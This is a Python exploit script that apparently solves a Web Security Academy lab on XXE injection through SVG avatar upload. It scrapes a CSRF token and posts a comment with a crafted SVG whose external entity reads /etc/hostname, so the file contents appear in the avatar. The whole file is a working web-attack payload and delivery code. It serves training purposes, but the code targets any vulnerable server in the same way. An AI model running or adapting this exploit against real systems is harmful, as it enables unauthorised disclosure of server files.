import requests
import sys
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter, Retry



def extract_csrf_token(response):
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    return csrf_token


def upload_xxe_file(url, session):
    try:
        response = requests.get(f"{url}/post?postId=1", timeout=10)
        csrf_token = extract_csrf_token(response)

        xxe_image_file = {
            "avatar": ("xxe.svg", '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>', "image/svg xml")
        }

        data = {
            "csrf": csrf_token,
            "postId": 1,
            "comment": "XXE Injection Successfully Completed. To view the /etc/hostname file, right click on the avatar image and open it in another tab",
            "name": "hacker",
            "email": "hacker@hacker.org",
            "website": "http://www.hacker.org"
        }

        file_upload_response = requests.post(f"{url}/post/comment", cookies={"session": response.cookies.values()[0]}, files=xxe_image_file, data=data, timeout=10)
        return file_upload_response.status_code == 200

    except requests.exceptions.Timeout:
        print("(-) Request timed out.")
        sys.exit(1)

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")
        sys.exit(1)

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")
        sys.exit(1)


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <url>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)


    url = sys.argv[1].rstrip("/")
    session = requests.Session()
    session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))

    if upload_xxe_file(url, session):
        print("(+) XXE Injection Successfully Completed")
        print(f"(+) Image containing the contents of the /etc/hostname file can be found in the comments section here: {url}/post?postId=1")
    else:
        print("(-) File was not uploaded successfully. Please check your url and try again.")


if __name__ == "__main__":
    main()